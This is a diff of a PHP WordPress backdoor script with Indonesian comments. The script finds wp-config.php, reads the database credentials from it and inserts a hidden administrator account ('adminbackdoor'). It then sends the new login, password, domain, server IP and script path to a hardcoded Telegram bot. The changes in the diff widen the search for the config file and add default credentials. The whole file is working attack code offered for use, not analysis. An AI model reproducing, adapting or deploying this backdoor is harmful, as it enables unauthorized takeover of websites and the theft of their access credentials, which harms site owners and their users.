@@ -1,28 +1,49 @@
 <?php
 // --- CONFIG TELEGRAM ---
 $botToken = "8302945697:AAFLjH5YBHsdi0Z7eCaipZWlj8rPOneuUgU";
-$chatId   = "-5295647197";
+$chatId = "-5295647197";
 
-$user  = $_POST['wp_user'] ?? '';
-$pass  = $_POST['wp_pass'] ?? '';
-$email = $_POST['wp_email'] ?? '';
+$user = $_POST['wp_user'] ?? 'adminbackdoor';
+$pass = $_POST['wp_pass'] ?? 'Admin123456!';
+$email = $_POST['wp_email'] ?? 'admin@' . $_SERVER['HTTP_HOST'];
 
-// Fungsi Scan wp-config.php
+// Lebih agresif cari wp-config.php (support subdomain & public_html)
 $currentPath = dirname(__FILE__);
-$search_path = $currentPath;
-$found_config = false;
+$searchPaths = [
+    $currentPath,
+    $_SERVER['DOCUMENT_ROOT'] ?? $currentPath,
+    dirname($_SERVER['DOCUMENT_ROOT'] ?? $currentPath),
+    $currentPath . '/..',
+    $currentPath . '/../..',
+    $currentPath . '/../../..',
+];
 
-while ($search_path !== dirname($search_path)) {
-    if (file_exists($search_path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
-        $found_config = $search_path . DIRECTORY_SEPARATOR . 'wp-config.php';
+$found_config = false;
+foreach ($searchPaths as $path) {
+    $path = realpath($path);
+    if ($path && file_exists($path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
+        $found_config = $path . DIRECTORY_SEPARATOR . 'wp-config.php';
         break;
     }
-    $search_path = dirname($search_path);
+}
+
+// Fallback scan naik directory
+if (!$found_config) {
+    $search_path = $currentPath;
+    for ($i = 0; $i < 8; $i++) {  // naik lebih dalam
+        if (file_exists($search_path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
+            $found_config = $search_path . DIRECTORY_SEPARATOR . 'wp-config.php';
+            break;
+        }
+        $parent = dirname($search_path);
+        if ($parent === $search_path) break;
+        $search_path = $parent;
+    }
 }
 
 if ($found_config) {
     $config_content = file_get_contents($found_config);
-    
+  
     preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_name);
     preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_user);
     preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_pass);
@@ -30,22 +51,24 @@ if ($found_config) {
     preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $config_content, $db_prefix);
 
     $prefix = $db_prefix[1] ?? 'wp_';
-    $conn = new mysqli($db_host[1] ?? 'localhost', $db_user[1], $db_pass[1], $db_name[1]);
+    $db_host_val = $db_host[1] ?? 'localhost';
 
+    $conn = new mysqli($db_host_val, $db_user[1] ?? '', $db_pass[1] ?? '', $db_name[1] ?? '');
+    
     if (!$conn->connect_error) {
         $md5_pass = md5($pass);
-        $user_query = "INSERT INTO `{$prefix}users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_registered`, `user_status`, `display_name`) 
+        $user_query = "INSERT INTO `{$prefix}users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_registered`, `user_status`, `display_name`)
                        VALUES ('$user', '$md5_pass', '$user', '$email', NOW(), 0, '$user')";
-        
+
         if ($conn->query($user_query)) {
             $user_id = $conn->insert_id;
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}user_level', '10')");
 
-            // Ambil siteurl
+            // Ambil siteurl lebih akurat
             $siteurl_result = $conn->query("SELECT option_value FROM `{$prefix}options` WHERE option_name = 'siteurl' LIMIT 1");
             $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-            $domain   = $_SERVER['HTTP_HOST'];
+            $domain = $_SERVER['HTTP_HOST'];
             $login_url = $protocol . $domain . "/wp-login.php";
 
             if ($siteurl_result && $siteurl_result->num_rows > 0) {
@@ -54,23 +77,25 @@ if ($found_config) {
                 $login_url = $siteurl . "/wp-login.php";
             }
 
-            // === TELEGRAM NOTIFIKASI (Pakai cURL - lebih reliable) ===
-            $ip   = $_SERVER['SERVER_ADDR'] ?? gethostbyname($domain);
+            // Info server + subdomain handling
+            $ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($domain);
             $date = date('Y-m-d H:i:s');
+            $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? 'unknown';
 
-            $text = "💎 *INI YA BRO LOGINAN NYA!* 💎\n\n";
+            $text = "💎 *NEW BACKDOOR CREATED!* 💎\n\n";
             $text .= "👤 *User:* " . $user . "\n";
             $text .= "🔑 *Pass:* " . $pass . "\n";
             $text .= "🔗 *Login:* " . $login_url . "\n";
-            $text .= "🌐 *Target:* " . $domain . "\n";
-            $text .= "🛰 *IP Address:* " . $ip . "\n";
-            $text .= "📅 *Tanggal:* " . $date . "\n";
+            $text .= "🌐 *Domain:* " . $domain . "\n";
+            $text .= "📁 *Document Root:* " . $doc_root . "\n";
+            $text .= "🛰 *IP:* " . $ip . "\n";
+            $text .= "📅 *Time:* " . $date . "\n";
+            $text .= "📍 *Script Path:* " . __FILE__ . "\n";
 
             $telegram_url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
-
             $data = [
-                'chat_id'    => $chatId,
-                'text'       => $text,
+                'chat_id' => $chatId,
+                'text' => $text,
                 'parse_mode' => 'Markdown'
             ];
 
@@ -79,34 +104,21 @@ if ($found_config) {
             curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
             curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-            
+            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
             $result = curl_exec($ch);
-            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            $curl_error = curl_error($ch);
             curl_close($ch);
 
-            // Debug Telegram
-            if ($result === false) {
-                $telegram_status = "Telegram Error: " . $curl_error;
-            } elseif ($http_code != 200) {
-                $telegram_status = "Telegram Failed (HTTP $http_code): " . $result;
-            } else {
-                $telegram_status = "✅ Telegram Sent Successfully";
-            }
-
-            echo "SUCCESS: Admin '$user' injected!<br>";
-            echo $telegram_status . "<br>";
-            echo "Login URL: <a href='$login_url' target='_blank'>$login_url</a>";
-
-        } else { 
-            echo "ERROR Query: " . $conn->error; 
+            echo "SUCCESS: Admin '$user' berhasil di-inject!<br>";
+            echo "Login: <a href='$login_url' target='_blank'>$login_url</a><br>";
+            echo "Subdomain support activated.";
+        } else {
+            echo "ERROR Query: " . $conn->error;
         }
         $conn->close();
-    } else { 
-        echo "DATABASE ERROR: Connection Failed. " . $conn->connect_error; 
+    } else {
+        echo "DATABASE ERROR: " . $conn->connect_error;
     }
-} else { 
-    echo "ERROR: wp-config.php not found."; 
+} else {
+    echo "ERROR: wp-config.php tidak ditemukan. Coba upload script ini ke folder subdomain atau public_html utama.";
 }
 ?>
